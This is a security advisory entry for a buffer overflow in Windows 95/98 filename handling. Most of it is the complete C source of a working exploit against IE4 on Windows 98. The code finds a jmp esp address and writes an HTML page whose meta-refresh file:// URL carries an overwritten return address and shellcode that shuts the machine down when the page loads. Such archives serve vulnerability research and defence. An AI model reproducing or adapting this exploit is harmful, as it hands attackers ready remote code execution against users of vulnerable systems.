source: http://www.securityfocus.com/bid/779/info

There is a overflowable buffer in the networking code for Windows 95 and 98 (all versions). The buffer is in the part of the code that handles filenames. By specifying an exceptionally long filename, an attacker can cause the machine to crash or execute arbitrary code. This vulnerability could be exploited remotely by including a hostile UNC or file:// URL in a web page or HTML email. The attack would occur when the page was loaded in a browser or the email was opened (including opening the email in a preview pane.) 

/*=============================================================================
   Microsoft IE4 for Windows98 exploit
   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
   Written by UNYUN (shadowpenguin@backsection.net)
  =============================================================================
*/

#include    <stdio.h>
#include    <windows.h>

#define     MAXBUF          1000
#define     RETADR          53


unsigned int mems[]={
0xbfe30000,0xbfe43000,0xbfe80000,0xbfe86000,
0xbfe90000,0xbfe96000,0xbfea0000,0xbfeb0000,
0xbfee0000,0xbfee5000,0xbff20000,0xbff47000,
0xbff50000,0xbff61000,0xbff70000,0xbffc6000,
0xbffc9000,0xbffe3000,0,0};

unsigned char   exploit_code[200]={
0x33,0xC0,0x40,0x40,0x40,0x40,0x40,0x50,
0x50,0x90,0xB8,0x2D,0x23,0xF5,0xBF,0x48,
0xFF,0xD0,0x00,
};

unsigned int search_mem(FILE *fp,unsigned char *st,unsigned char *ed,
                unsigned char c1,unsigned char c2)
{
    unsigned char   *p;
    unsigned int    adr;

    for (p=st;p<ed;p++)
        if (*p==c1 && *(p+1)==c2){
            adr=(unsigned int)p;
            if ((adr&0xff)==0) continue;
            if (((adr>>8)&0xff)==0) continue;
            if (((adr>>16)&0xff)==0) continue;
            if (((adr>>24)&0xff)==0) continue;
            return(adr);
        }
    return(0);

}


main(int argc,char *argv[])
{
    FILE                    *fp;
    unsigned int            i,ip;
    unsigned char           buf[MAXBUF];

    if (argc<2){
        printf("usage %s output_htmlfile\n",argv[0]);
        exit(1);
    }
    if ((fp=fopen(argv[1],"wb"))==NULL) return FALSE;   
    fprintf(fp,"<META HTTP-EQUIV=\"Refresh\" CONTENT=\"0;URL=file://test/");
    for (i=0;;i+=2){
        if (mems[i]==0){
            printf("Can not find jmp code.\n");
            exit(1);
        }
        if ((ip=search_mem(fp,(unsigned char *)mems[i],
            (unsigned char *)mems[i+1],0xff,0xe4))!=0) break;
    }
    printf("Jumping address : %x\n",ip);
    memset(buf,0x41,MAXBUF);
    
    buf[RETADR-1]=0x90;
    buf[RETADR  ]=ip&0xff;
    buf[RETADR+1]=(ip>>8)&0xff;
    buf[RETADR+2]=(ip>>16)&0xff;
    buf[RETADR+3]=(ip>>24)&0xff;

    memcpy(buf+80,exploit_code,strlen(exploit_code));
    buf[MAXBUF]=0;
    fprintf(fp,"%s/\">\n<HTML><B>",buf);
    fprintf(fp,"10 seconds later, this machine will be shut down.</B><BR><BR>");
    fprintf(fp,"If you are using IE4 for Japanese Windows98, ");
    fprintf(fp,"maybe, the exploit code which shuts down your machine will be executed.<BR>");
    fprintf(fp,"</HTML>\n");
    fclose(fp);
    printf("%s created.\n",argv[1]);
    return FALSE;
}